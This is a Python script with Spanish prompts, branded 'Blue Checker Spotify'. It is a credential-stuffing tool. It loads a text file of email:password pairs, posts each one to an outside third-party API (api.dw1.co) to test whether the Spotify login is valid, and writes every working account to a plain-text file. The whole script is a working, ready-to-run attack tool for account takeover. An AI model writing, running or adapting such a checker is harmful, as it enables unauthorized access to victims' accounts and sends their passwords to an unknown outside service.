import requests
import os

def Limpieza():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def Logo():
    print('''
██████╗ ██╗     ██╗   ██╗███████╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗
██╔══██╗██║     ██║   ██║██╔════╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██████╔╝██║     ██║   ██║█████╗      ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██╔══██╗██║     ██║   ██║██╔══╝      ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝███████╗╚██████╔╝███████╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

███████╗██████╗  ██████╗ ████████╗██╗███████╗██╗   ██╗
██╔════╝██╔══██╗██╔═══██╗╚══██╔══╝██║██╔════╝╚██╗ ██╔╝
███████╗██████╔╝██║   ██║   ██║   ██║█████╗   ╚████╔╝
╚════██║██╔═══╝ ██║   ██║   ██║   ██║██╔══╝    ╚██╔╝
███████║██║     ╚██████╔╝   ██║   ██║██║        ██║
╚══════╝╚═╝      ╚═════╝    ╚═╝   ╚═╝╚═╝        ╚═╝

[-] Sources | https://github.com/lSources [-]

[════════════════════════════════════════════════════════════════════════════════════════════]
''')

def Menu():
    orden=0
    correo=[]
    contraseña=[]
    cuentasCorrectas=[]

    Limpieza()
    Logo()

    try:
        print("La lista de cuentas a verificar debe encontrarse en el formato 'correo:contraseña', ademas, el ")
        print("archivo en cuestion debe ser un archivo de texto ('.txt').")
        print('')
        archivo = input('Nombre del archivo: ')
        archivoLectura = open(archivo).read().splitlines()

    except Exception as f:
        print('')
        print('No se encontro el archivo.')
        exit('')

    Limpieza()
    Logo()

    print('Analizando el archivo "'+archivo+'"...')

    try:
        for separador in archivoLectura:
            cuenta = separador.split(":")
            correo.append(cuenta[0])
            contraseña.append(cuenta[1])
    except IndexError:
        print('')
        print("Asegúrese de que todas las cuentas esten en el formato 'correo:contraseña'.")
        exit('')

    print('')
    print('¡Se cargaron ' + str(len(archivoLectura)) + ' cuentas satisfactoriamente!')
    print('')
    print('[════════════════════════════════════════════════════════════════════════════════════════════]')
    print('')

    contra = len(contraseña)

    while orden < contra:
        orden+=1
        soli = requests.post('https://api.dw1.co/spotify/v2/check', data={'email':correo[orden-1],'password':contraseña[orden-1]})
        inic = '[==============================]\n'

        with open('CuentasSpotify.txt','a+') as guardar:
            if 'true' in soli.text:
                cuentasCorrectas.append(correo[orden-1])
                guardar.write(inic)
                guardar.write('Correo: {}\n'.format(correo[orden-1]))
                guardar.write('Contraseña: {}\n'.format(contraseña[orden-1]))
                guardar.close()

                print('[Cuenta Correcta]    ->  ' +correo[orden-1]+ ' - ' +contraseña[orden-1])
                print('')
            else:
                print('[Cuenta Incorrecta]  ->  ' +correo[orden-1]+ ' - ' +contraseña[orden-1])
                print('')

    print('[════════════════════════════════════════════════════════════════════════════════════════════]')
    print('')
    print('Podra encontrar las ' +str(len(cuentasCorrectas))+ " cuentas correctas en el archivo 'CuentasSpotify.txt'")
    print('')
    print('[════════════════════════════════════════════════════════════════════════════════════════════]')
    print('')

try:
    Menu()

except KeyboardInterrupt:
    print('\n')
    print('[════════════════════════════════════════════════════════════════════════════════════════════]')
    print('')
    print('Cerrando programa...')
    print('')
    print('[════════════════════════════════════════════════════════════════════════════════════════════]')
    exit('')
